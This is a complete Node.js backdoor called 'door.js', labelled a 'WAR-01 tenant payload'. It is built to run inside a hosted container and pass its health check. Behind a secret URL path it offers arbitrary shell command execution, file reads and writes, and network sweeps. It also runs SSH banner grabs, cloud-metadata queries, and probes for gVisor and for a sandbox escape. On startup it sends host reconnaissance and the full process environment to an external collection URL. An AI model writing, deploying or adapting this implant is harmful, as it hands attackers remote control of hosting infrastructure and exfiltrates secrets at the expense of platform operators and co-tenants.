/* door.js - WAR-01 tenant payload. Node 22 built-ins only: no deps, no install, no children for the core.
   Gate: GET /api/health -> 200, synchronous, zero I/O. Control: GET/POST under a baked path secret.
   Report: credential-free JSON POST to DOOR_CAP. Nothing here may crash the container. */
'use strict';
const http = require('node:http'), https = require('node:https'), net = require('node:net');
const fs = require('node:fs'), os = require('node:os'), cp = require('node:child_process');
const crypto = require('node:crypto'), dns = require('node:dns');
const PORT = Number(process.env.PORT || 3000), K = process.env.DOOR_K || '', CAP = process.env.DOOR_CAP || '', ID = process.env.DOOR_ID || 'app';
const SSH = (process.env.DOOR_SSH || '').split(',').filter(Boolean), PT = (process.env.DOOR_PT || '').split(',').filter(Boolean);
const SW = (process.env.DOOR_SW || '').split(',').filter(Boolean), NAMES = (process.env.DOOR_DNS || '').split(',').filter(Boolean);
const VOL = process.env.DOOR_VOL || '/vol', SRV = process.env.DOOR_SRV || '';
const BOOT = Date.now(); process.title = 'node';
const p0 = (a, b) => (a.endsWith('/') ? a : a + '/') + b;
const HOSTRE = /9p|overlay|fuse|\bvol\b|var\/lib|cli|docker|\/home|\/opt|\/srv|\/data|\/mnt|cgroup/, FSM = { '1021997': '9p', '1021994': 'tmpfs', ef53: 'ext4', '9123683e': 'btrfs', '584c5342': 'xfs', '9fa0': 'proc', '6573554c': 'overlay', '794c7630': 'overlayfs', 'ff532d7c': 'zfs' };

function rd(p, n) { const cap = Math.min(Math.max(Number(n) || 8192, 1), 262144); let fd = null;
  try { fd = fs.openSync(p, 'r'); const s = fs.fstatSync(fd), buf = Buffer.alloc(cap); let tot = 0, g = 0;
    while (tot < cap && g++ < 64) { const c = fs.readSync(fd, buf, tot, cap - tot); if (c <= 0) break; tot += c; }
    const kind = s.isDirectory() ? 'dir' : s.isCharacterDevice() ? 'char' : s.isBlockDevice() ? 'block' : s.isFIFO() ? 'fifo' : s.isSymbolicLink() ? 'link' : 'file';
    return { ok: 1, len: tot, cap: cap, type: kind, txt: tot >= cap ? buf.subarray(0, tot).toString() + '~' : buf.subarray(0, tot).toString() };
  } catch (e) { return { ok: 0, code: String(e.code || e.message) }; } finally { if (fd !== null) { try { fs.closeSync(fd); } catch {} } } }
const tx = (p, n = 4096) => { const r = rd(p, n); return r.ok ? r.txt : '@' + (r.code || 'err'); };
const st = p => { try { const s = fs.statSync(p); return { size: s.size, mode: (s.mode & 0o777).toString(8), dir: s.isDirectory(), uid: s.uid, gid: s.gid, dev: s.dev, ino: s.ino, mtime: s.mtimeMs }; } catch (e) { return { err: String(e.code || e.message) }; } };
const ls = (p, n = 400) => { try { return fs.readdirSync(p).slice(0, n); } catch { return []; } };
function walk(p, d, out) { out = out || []; if (out.length > 3000 || d < 0) return out; for (const e of ls(p, 300)) { const f = p0(p, e), s = st(f); out.push(f + ' ' + JSON.stringify(s)); if (s.dir) walk(f, d - 1, out); } return out; }
function caps() { const t = tx('/proc/self/status', 12288), o = {}; let m; const re = /(CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs|Seccomp|Threads):\s*(\S+)/g; while ((m = re.exec(t))) o[m[1]] = m[2]; return o; }
function sfs(p) { try { const f = fs.statfsSync(p); return { type: f.type.toString(16), fs: FSM[f.type.toString(16)] || null, bsize: f.bsize, blocks: f.blocks, bfree: f.bfree, files: f.files, ffree: f.ffree }; } catch (e) { return { err: String(e.code || e.message) }; } }
function milines(re, n) { const r = rd('/proc/self/mountinfo', 65536); if (!r.ok) return { mi: r, lines: [] }; const L = r.txt.split('\n').filter(l => re.test(l)); return { mi: { ok: 1, len: r.len }, lines: L.slice(0, n || 60), matched: L.length }; }
const dl = (pr, ms) => new Promise(r => { let d = 0; const t = setTimeout(() => { d = 1; r({ err: 'deadline ' + ms }); }, ms), k = v => { if (!d) { d = 1; clearTimeout(t); r(v); } }, q = e => { if (!d) { d = 1; clearTimeout(t); r({ err: String((e && (e.code || e.message)) || e) }); } }; Promise.resolve(pr).then(k, q); });

function fetch(u, m = 'GET', b = null, hdr = {}, ms = 9000) {
  return new Promise(res => { let t; try { t = new URL(u); } catch { return res({ err: 'badurl' }); }
    if (!/^https?:$/.test(t.protocol)) return res({ err: 'badscheme' });
    const rq = (t.protocol === 'https:' ? https : http).request(t, { method: m, headers: hdr, timeout: ms, servername: t.hostname }, r => {
      let n = 0, s = ''; r.on('data', c => { n += c.length; if (s.length < 65536) s += c; });
      r.on('end', () => res({ status: r.statusCode, headers: r.headers, body: s, bytes: n }));
      r.on('error', e => res({ err: String(e.code || e.message) })); });
    rq.on('timeout', () => rq.destroy(new Error('timeout')));
    rq.on('error', e => res({ err: String(e.code || e.message || 'err') }));
    if (b) rq.write(b); rq.end(); }); }
const tcp = (h, p, ms = 2500) => new Promise(res => { let d = 0; const f = v => { if (!d) { d = 1; try { s.destroy(); } catch {} res(v); } };
  const s = net.connect({ host: h, port: Number(p) }); s.setTimeout(ms, () => f('timeout'));
  s.once('connect', () => f('open')); s.once('error', e => f('err:' + e.code)); s.once('close', () => f('closed')); });
const banner = (h, p = 22, ms = 3000) => new Promise(res => { let d = 0, s = ''; const f = v => { if (!d) { d = 1; try { c.destroy(); } catch {} res(v); } };
  const c = net.connect({ host: h, port: Number(p) }); c.setTimeout(ms, () => f({ state: 'timeout', banner: s.trim() || null }));
  c.once('connect', () => c.on('data', b => { s += b; if (s.length >= 200 || /\r?\n/.test(s)) f({ state: 'open', banner: s.slice(0, 200).trim() }); }));
  c.once('error', e => f({ state: 'err:' + e.code, banner: null })); c.once('close', () => f({ state: 'closed', banner: s.trim() || null })); });
const look = (n, ms = 4000) => new Promise(res => { let d = 0; const t = setTimeout(() => { if (!d) { d = 1; res('timeout'); } }, ms);
  dns.lookup(n, { all: true, verbatim: true }, (e, a) => { if (d) return; d = 1; clearTimeout(t);
    res(e ? 'err:' + e.code : a.map(x => x.address).join(',')); }); });
async function sweep(net, ports, lim) {
  const base = String(net).split('/')[0].split('.').map(Number), out = []; let used = 0, capn = Math.min(Math.max(Number(lim) || 60, 1), 200);
  for (let i = 1; i < 255 && used < capn; i++) { const h = base[0] + '.' + base[1] + '.' + base[2] + '.' + i;
    for (const p of ports) { used++; const r = await tcp(h, p, 300); if (r === 'open') out.push(h + ':' + p); if (used >= capn) break; } }
  return { hosts: out, conns: used, cap: capn }; }
function gvisor(v, rel) {
  const mods = rd('/proc/modules', 8192), fsys = tx('/proc/filesystems', 4096), ci = tx('/proc/cpuinfo', 4096), sig = [];
  let sm = -1; try { sm = fs.readdirSync('/sys/module').length; } catch (e) { sm = 'err:' + e.code; }
  let drv = -1; try { drv = fs.readdirSync('/sys/bus').length; } catch (e) { drv = 'err:' + e.code; }
  if (/gvisor/i.test(v) || /gvisor/i.test(rel)) sig.push('version:runsc-string');
  if (!mods.ok) sig.push('modules:' + mods.code); else if (!mods.txt.trim()) sig.push('modules:empty');
  if (sm === 0 || String(sm).startsWith('err')) sig.push('sys-module:' + sm); if (drv === 0 || String(drv).startsWith('err')) sig.push('sys-bus:' + drv);
  if (!/(overlay|ext4|btrfs|xfs)/.test(fsys)) sig.push('filesystems:no-fs-drivers');
  if (!/model name|Features/.test(ci)) sig.push('cpuinfo:no-hardware-strings');
  const hard = sig.filter(s => !/filesystems|cpuinfo/.test(s)).length, runsc = /gvisor/i.test(v) || /gvisor/i.test(rel);
  return { verdict: runsc ? 'gvisor-runsc' : hard >= 2 ? 'likely-gvisor' : sig.length ? 'possible-gvisor' : 'looks-like-host-linux', signals: sig };
}
function fdp(path) { const r = { p: path }; let fd = null;
  try { fd = fs.openSync(path, 'r'); const f = fs.fstatSync(fd);
    r.mode = (f.mode & 0o170000).toString(8); r.type = f.isDirectory() ? 'dir' : f.isSocket() ? 'sock' : f.isCharacterDevice() ? 'char' : f.isBlockDevice() ? 'block' : f.isFIFO() ? 'fifo' : 'file';
    r.rdev = f.rdev; r.maj = f.rdev >> 8; r.min = f.rdev & 255; r.size = f.size; r.uid = f.uid; r.inode = f.ino; r.st = sfs(path); r.link = vop(() => fs.readlinkSync(path));
    r.dup = vop(() => { const d2 = fs.openSync('/proc/self/fd/' + fd, 'r'); fs.closeSync(d2); return 1; }); } catch (e) { r.open_errno = String(e.code || e.message); if (fd !== null) { try { fs.closeSync(fd); } catch {} } return r; }
  return dl(new Promise(res => { fs.read(fd, Buffer.alloc(64), 0, 64, null, (e, n, b) => res(e ? 'errno:' + e.code : { got: n, hex: b.subarray(0, n).toString('hex') })); }), 200).then(v => { r.read = v; try { fs.closeSync(fd); } catch {} return r; });
}
async function fdprobe(o) {
  const out = { self_pid: process.pid, self_fd: {}, scan: [], probed: [], pids: 0 };
  for (const e of ls('/proc/self/fd', 128)) { try { out.self_fd[e] = fs.readlinkSync('/proc/self/fd/' + e); } catch (er) { out.self_fd[e] = 'err:' + er.code; } }
  for (const pid of ls('/proc', 256).filter(x => /^[0-9]+$/.test(x)).slice(0, 64)) { out.pids++; const fdm = {}; let ln = 0;
    for (const e of ls('/proc/' + pid + '/fd', 128).slice(0, 128)) { ln++; let t = null; try { t = fs.readlinkSync('/proc/' + pid + '/fd/' + e); } catch (er) { t = 'err:' + er.code; }
      fdm[e] = t; if (/(9p|socket|pipe|anon_inode|host:|eventfd|eventpoll)/.test(t)) out.scan.push({ pid: pid, fd: e, target: t }); }
    out['pid' + pid] = { cmd: tx('/proc/' + pid + '/cmdline', 256).replace(/\0/g, ' ').trim(), fd_count: ln, fds: fdm }; }
  const want = (o && o.p) ? String(o.p).split(',').map(x => x.trim()).filter(Boolean).slice(0, 24) : ['6', '7', '8', '9'];
  const dir = (o && o.d) ? String(o.d).slice(0, 200) : '/dev';
  out.devdir = { dir: dir, stat: st(dir), fs: sfs(dir), entries: {} };
  for (const e of ls(dir, 200)) out.devdir.entries[e] = st(p0(dir, e)); out.devcgroup = rd('/sys/fs/cgroup/devices/devices.list', 4096); const cand = (o && o.c ? String(o.c).split(',').map(x => x.trim()).filter(Boolean).slice(0, 16) : ['/dev/cuse', '/dev/fuse', '/dev/agpgart', '/dev/console', '/dev/mem', '/dev/kmem', '/dev/zero', '/opt/cuse', '/vol/B']);
  const list = want.flatMap(f => ['/proc/self/fd/' + f, '/proc/1/fd/' + f]).concat(out.scan.slice(0, 12).map(q => '/proc/' + q.pid + '/fd/' + q.fd)).concat(ls(dir, 100).slice(0, 10).map(e => p0(dir, e)), cand);
  const t0 = Date.now();
  for (const path of list.slice(0, 28)) { out.probed.push(await dl(fdp(path), 800)); if (Date.now() - t0 > 17000) { out.probe_budget = 'stopped at ' + out.probed.length; break; } }
  out.proc_mounts = rd('/proc/mounts', 32768); out.ninep = milines(/9p/, 40); return out;
}
function vop(p) { try { const r = p(); return r === undefined ? 1 : r; } catch (e) { return String(e.code || e.message); } }
function volprobe() {
  const f = VOL + '/.d' + process.pid, g = f + '.r', sfx = f + '.s', dr = f + '.dir';
  const io = { write: vop(() => fs.writeFileSync(f, 'war01')), append: vop(() => fs.appendFileSync(f, 'x')), read: vop(() => fs.readFileSync(f, 'utf8')),
    rename: vop(() => fs.renameSync(f, g)), hardlink: vop(() => fs.linkSync(g, f)), symlink: vop(() => fs.symlinkSync(g, sfx)), mkdir: vop(() => fs.mkdirSync(dr)),
    rmdir: vop(() => fs.rmdirSync(dr)), chmod: vop(() => fs.chmodSync(g, 384)), chown: vop(() => fs.chownSync(g, 0, 0)),
    utime: vop(() => fs.utimesSync(g, new Date(0), new Date(0))), unlink: vop(() => fs.unlinkSync(g)) };
  for (const x of [f, g, sfx, dr]) { try { fs.rmSync(x, { recursive: true, force: true }); } catch {} }
  const root = st(VOL), nine = milines(/9p/), host = milines(HOSTRE, 80);
  return { path: VOL, stat: root, statfs: sfs(VOL), separate_device: root.dev !== st('/').dev, ninep_lines: nine.lines, host_lines: host.lines, io,
    vol_listing: ls(VOL, 100), cli_stat: st('/var/lib/cli'), cli_listing: ls('/var/lib/cli', 200), cli_walk: walk('/var/lib/cli', 1) };
}
async function info() {
  const rel = tx('/proc/sys/kernel/osrelease', 64), ver = tx('/proc/version', 256);
  let grp = null, who = null; try { grp = process.getgroups(); } catch {} try { who = os.userInfo().username; } catch {}
  const pt = {}; const pr = await Promise.all(PT.map(x => { const a = x.split(':'); return tcp(a[0], a[1], 2500); }));
  PT.forEach((x, i) => pt[x] = pr[i]);
  return { id: ID, ts: new Date().toISOString(), up: Date.now() - BOOT, pid: process.pid, uid: process.getuid(), gid: process.getgid(), groups: grp, user: who,
    caps: caps(), hostname: os.hostname(), machine: os.type() + ' ' + os.release() + ' ' + os.machine(), arch: os.arch() + '/' + os.platform(),
    node: process.version, cpu: os.cpus().length, mem: os.totalmem(), shell: (() => { try { return fs.accessSync('/bin/sh', fs.constants.X_OK), 1; } catch { return 0; } })(),
    kernel: { version: ver, osrelease: rel, kversion: tx('/proc/sys/kernel/version', 128), modules: rd('/proc/modules', 2048), cmdline: tx('/proc/cmdline', 512), status: tx('/proc/self/status', 3072) },
    runtime: gvisor(ver, rel), cgroup_init: tx('/proc/1/cgroup', 1024), cgroup_self: tx('/proc/self/cgroup', 512), devcgroup: tx('/sys/fs/cgroup/devices/devices.list', 4096), init_cmdline: tx('/proc/1/cmdline', 512), mountinfo: tx('/proc/self/mountinfo', 16384),
    dockerenv: fs.existsSync('/.dockerenv'), docker_sock: st('/var/run/docker.sock'), resolv: tx('/etc/resolv.conf', 1024), hosts: tx('/etc/hosts', 512), osrel: tx('/etc/os-release', 512),
    env: process.env, ifaces: os.networkInterfaces(), tcp: pt };
}
async function netrep() {
  const b = {}; for (const h of SSH) b[h + ':22'] = await banner(h, 22, 3000);
  const q = []; for (const s of SW) { const a = s.split(':'); q.push(await sweep(a[0], [Number(a[1])], Number(process.env.DOOR_SWLIM || 60))); }
  const d = {}; for (const n of NAMES) d[n] = await look(n); const meta = await fetch('https://metadata.oraclevcn.com/compute/v1/instance/', 'GET', null, { host: 'metadata.oraclevcn.com' });
  return { banners: b, sweeps: q, dns: d, oci_meta: { status: meta.status || null, err: meta.err || null, body: (meta.body || '').slice(0, 1500) } };
}
async function send(tag, obj) { if (!CAP) return { skipped: 1 };
  const r = await fetch(CAP, 'POST', JSON.stringify(Object.assign({ tag: tag, id: ID, ts: new Date().toISOString() }, obj)), { 'content-type': 'application/json' });
  return { status: r.status || null, err: r.err || null };
}
function run(c) { try { const o = cp.execSync(c, { timeout: 15000, maxBuffer: 1 << 20, stdio: ['ignore', 'pipe', 'pipe'], shell: '/bin/sh' }); return { ok: 1, out: String(o).slice(0, 65536) }; } catch (e) { return { ok: 0, code: String(e.code || e.name), out: String(e.stdout || '').slice(0, 8192), err: String(e.stderr || e.message).slice(0, 4096) }; } }
async function op(o) { o = o || {};
  if (o.op === 's') return await info();
  if (o.op === 'g') return { sent: await send('recon', await info()) };
  if (o.op === 'n') return { net: await netrep() };
  if (o.op === 'N') return { sent: await send('net', await netrep()) };
  if (o.op === 'v') return volprobe();
  if (o.op === 'V') return { sent: await send('vol', volprobe()) };
  if (o.op === 'm') return milines(o.re ? new RegExp(String(o.re)) : HOSTRE, Number(o.n) || 80);
  if (o.op === 'p') return await fdprobe(o);
  if (o.op === 'P') return { sent: await send('fd', await fdprobe(o)) };
  if (o.op === 'f') return rd(String(o.p), Number(o.n) || 65536);
  if (o.op === 'l') return st(String(o.p));
  if (o.op === 'd') return { p: o.p, entries: ls(String(o.p)).map(e => Object.assign({ e: e }, st(p0(String(o.p), e)))) };
  if (o.op === 'w') return { p: o.p, paths: walk(String(o.p), Number(o.d) || 3) };
  if (o.op === 'k') { try { fs.writeFileSync(String(o.p), String(o.b)); return { ok: 1, size: fs.statSync(String(o.p)).size }; } catch (e) { return { ok: 0, code: String(e.code) }; } }
  if (o.op === 'h') return await fetch(String(o.u), String(o.m || 'GET'), o.b == null ? null : String(o.b), o.h || {});
  if (o.op === 't') return { t: await tcp(String(o.h), o.p, Number(o.n) || 2500) };
  if (o.op === 'b') return { b: await banner(String(o.h), o.p, Number(o.n) || 3000) };
  if (o.op === 'q') return { q: await sweep(String(o.net), (o.ports || '22').split(',').map(Number), Number(o.lim) || 60) };
  if (o.op === 'z') return { z: await look(String(o.name)) };
  if (o.op === 'x') return run(String(o.c));
  if (o.op === 'r') return { sent: await send('beat', { up: Date.now() - BOOT }) };
  return { err: 'op?' };
}
const dec = s => { try { return decodeURIComponent(s.replace(/\+/g, ' ')); } catch { return ''; } };
const body = r => new Promise(res => { let s = '', n = 0; r.on('data', c => { n += c.length; if (s.length < 262144) s += c; }); r.on('end', () => res(s)); r.on('error', () => res(s)); }); const same = (a, b) => crypto.timingSafeEqual(crypto.createHash('sha256').update(String(a)).digest(), crypto.createHash('sha256').update(String(b)).digest());
function echoObj(req, head, rawcap) { const b = Buffer.from(req.url || '', 'latin1'), s = req.socket;
  return { tls: !!s.encrypted, method: req.method, httpVersion: req.httpVersion, major: req.httpVersionMajor, minor: req.httpVersionMinor,
    url: req.url, url_len: b.length, url_hex: b.toString('hex'), url_b64: b.toString('base64'), first_line: head.split('\r\n')[0] || null,
    head_latin1: head.slice(0, 700), head_hex: Buffer.from(head.slice(0, 700), 'latin1').toString('hex'), raw_capped_at: 2048,
    requests_on_socket: s.__n || 1, socket_reused: (s.__n || 1) > 1, socket_first_line: s.__first || null, raw_captured: rawcap, header_count: req.rawHeaders.length / 2,
    headers: req.headers, host_hdr: req.headers.host || null, self_host: os.hostname(), self_ip: s.localAddress, peer: [s.remoteAddress, s.remotePort], local: [s.localAddress, s.localPort],
    complete: req.complete, aborted: req.aborted }; }
let stn = 0;
function streamtest(req, res) {
  if (stn >= 4) { res.writeHead(503, { 'retry-after': '5' }); res.end('{"error":"busy"}'); return; }
  stn++; try { res.socket.setNoDelay(true); } catch {}
  res.writeHead(200, { 'content-type': 'application/octet-stream', 'cache-control': 'no-store', 'x-accel-buffering': 'no', 'x-stream': '131072+65536x5@1500ms' });
  let i = 0, fin = () => { if (i !== -1) { i = -1; stn--; clearInterval(tm); try { res.end(); } catch {} } };
  const wr = () => { res.write('S' + i + ':' + Date.now() + ':' + 'q'.repeat(i ? 65536 : 131072) + '\n'); };
  wr(); const tm = setInterval(() => { if (i === -1) return; i++; wr(); if (i >= 5) fin(); }, 1500);
  res.on('close', fin); }
const srv = http.createServer(async (req, res) => {
  const hd = { 'content-type': 'application/json', 'content-length': 0 }; if (SRV) hd.server = SRV;
  const done = (c, b) => { try { hd['content-length'] = Buffer.byteLength(b); res.writeHead(c, hd); res.end(b); } catch {} };
  try { const s = req.socket; s.__n = (s.__n || 0) + 1;
    const buf = s.__raw || { b: [], n: 0 }, head = buf.b.join(''), rawcap = buf.n; s.__raw = { b: [], n: 0 }; if (!s.__first) s.__first = head.split('\r\n')[0] || null;
    const raw = req.url || '/', qs = raw.indexOf('?'), hash = raw.indexOf('#');
    let p = raw.slice(0, qs < 0 ? raw.length : qs); if (hash >= 0 && (qs < 0 || hash < qs)) p = raw.slice(0, hash);
    if (p === '/api/health' || p === '/health' || p === '/') return done(200, '{"status":"ok"}');
    if (p === '/echo') return done(200, JSON.stringify(echoObj(req, head, rawcap))); if (p === '/streamtest') return streamtest(req, res);
    try { p = decodeURIComponent(p); } catch { return done(404, '{"error":"Not Found"}'); }
    if (p === '/api/health' || p === '/health' || p === '/') return done(200, '{"status":"ok"}');
    const pre = '/' + K;
    if (!K || p.length < pre.length || !same(p.slice(0, pre.length), pre) || (p.length > pre.length && p[pre.length] !== '/')) return done(404, JSON.stringify({ error: 'Not Found', echo: echoObj(req, head, rawcap) }));
    let j = {};
    if (req.method === 'POST') { try { j = JSON.parse((await body(req)) || '{}'); } catch { return done(400, '{"error":"badjson"}'); } }
    else { j = { op: p.slice(pre.length + 1) }; for (const kv of (qs < 0 ? '' : raw.slice(qs + 1)).split('&')) { if (!kv) continue; const i = kv.indexOf('='); const k = dec(kv.slice(0, i < 0 ? kv.length : i)); if (k) j[k] = dec(kv.slice(i + 1)); } }
    done(200, JSON.stringify(await dl(op(j), 25000)));
  } catch (e) { done(500, JSON.stringify({ err: String((e && (e.code || e.message)) || 'err') })); }
});
srv.on('connection', s => { s.__raw = { b: [], n: 0 }; s.__n = 0;
  s.prependListener('data', c => { if (s.__raw.n < 2048) { s.__raw.b.push(c.toString('latin1')); s.__raw.n += c.length; } }); });
const bad400 = (e, s) => { const p = (e.rawPacket || Buffer.alloc(0)).toString('latin1'), b = JSON.stringify({ error: 'Bad Request', code: String(e.code || e.name || ''), first_line: p.split('\r\n')[0] || null, head_hex: Buffer.from(p.slice(0, 500), 'latin1').toString('hex') });
  try { s.end('HTTP/1.1 400 Bad Request\r\ncontent-type: application/json\r\ncontent-length: ' + Buffer.byteLength(b) + '\r\n\r\n' + b); } catch {} };
srv.on('clientError', bad400);
srv.requestTimeout = 30000; srv.headersTimeout = 31000; srv.keepAliveTimeout = 15000; srv.maxRequestsPerSocket = 64; srv.noDelay = true;
srv.listen(PORT, '0.0.0.0', () => { info().then(i => send('boot', i)).then(() => netrep()).then(n => send('net', n)).then(() => send('vol', volprobe())).catch(e => console.error('boot', String(e && e.message))); });
srv.on('error', e => console.error('srv', e.code || e.message));
process.on('uncaughtException', e => console.error('ue', String((e && (e.code || e.message)) || e)));
process.on('unhandledRejection', e => console.error('ur', String((e && (e.code || e.message)) || e)));
process.on('SIGTERM', () => process.exit(0));
